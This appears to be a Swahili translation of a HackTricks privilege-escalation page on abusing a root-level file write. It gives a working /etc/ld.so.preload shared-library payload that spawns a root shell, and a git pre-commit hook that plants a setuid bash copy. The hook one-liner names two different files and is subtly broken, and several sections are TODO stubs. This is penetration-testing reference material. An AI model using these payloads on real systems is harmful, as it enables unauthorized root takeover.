# Kuandika Faili Kila Mahali kwa Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Faili hili linafanya kazi kama **`LD_PRELOAD`** env variable lakini pia linafanya kazi katika **SUID binaries**.\
Ikiwa unaweza kulifanya au kulibadilisha, unaweza tu kuongeza **njia ya maktaba ambayo itapakiwa** na kila binary inayotekelezwa.

Kwa mfano: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) ni **scripts** ambazo zina **endesha** kwenye **matukio** mbalimbali katika hazina ya git kama wakati **commit** inaundwa, **merge**... Hivyo kama **script au mtumiaji mwenye mamlaka** anafanya vitendo hivi mara kwa mara na inawezekana **kuandika kwenye folda ya `.git`**, hii inaweza kutumika kwa **privesc**.

Kwa mfano, inawezekana **kuunda script** katika hazina ya git kwenye **`.git/hooks`** ili kila wakati inatekelezwa wakati **commit** mpya inaundwa:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

TODO

### Service & Socket files

TODO

### binfmt_misc

Failu iliyo katika `/proc/sys/fs/binfmt_misc` inaonyesha ni binary ipi inapaswa kutekeleza aina gani ya faili. TODO: angalia mahitaji ya kutumia hii kutekeleza rev shell wakati aina ya faili ya kawaida imefunguliwa.

{{#include ../../banners/hacktricks-training.md}}
